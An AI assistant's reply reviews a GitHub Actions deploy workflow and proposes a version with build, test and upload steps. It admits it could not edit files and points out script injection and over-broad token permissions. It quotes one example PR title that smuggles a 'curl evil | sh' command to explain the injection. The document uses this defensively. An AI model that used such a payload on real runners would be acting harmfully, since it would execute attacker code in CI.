I didn't change the workflow. I don't have a file-editing tool in this session, and the workflow as written has no build step or test step to attach an upload to.

**What's in `.github/workflows/deploy.yml`:** It runs on `pull_request` and has two steps: `actions/checkout@v4` and an `echo` of the PR title. Nothing builds anything, so there's no artifact to upload yet.

**A proposed version** (once you tell me your build and test commands and where the output goes):

```yaml
---
name: deploy

on:
  pull_request:

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Show PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
      - name: Build
        run: <your build command>        # e.g. make build
      - name: Test
        run: <your test command>         # e.g. make test
      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: build
          path: <build output path>      # e.g. dist/
          if-no-files-found: error
```

Steps run in order and the job stops at the first failure, so the upload only happens if the tests pass. `if-no-files-found: error` makes the job fail if the build output is missing, instead of passing with nothing uploaded.

**Two security problems in the current file.** I included fixes for both in the YAML above:

1. **Script injection (line 14):** `${{ github.event.pull_request.title }}` is pasted straight into the shell command. Anyone who opens a PR can pick a title like `"; curl evil | sh; #`, and that code runs on your runner. The fix is to pass the title in through `env:` and quote it, as shown above.
2. **`permissions: write-all` (line 7):** This hands a write-scoped token to every step that the injection above can reach. `contents: read` is enough for checkout, build, test and upload, because `upload-artifact` doesn't need extra token permissions.

Send me the build command, test command and output path, and either apply the edit yourself or give me a session where I can edit files.
